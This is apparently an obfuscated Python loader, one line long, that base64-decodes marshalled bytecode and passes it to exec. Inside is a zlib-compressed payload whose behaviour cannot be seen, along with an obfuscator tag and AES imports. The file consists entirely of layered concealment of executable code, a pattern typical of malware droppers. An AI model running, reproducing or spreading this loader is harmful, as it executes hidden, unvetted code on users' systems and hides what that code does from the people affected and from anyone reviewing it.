import zlib,marshal,base64;from Crypto.Cipher import AES;from Crypto.Random import get_random_bytes;from Crypto.Util.Padding import pad, unpad;exec(marshal.loads(base64.b64decode("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")))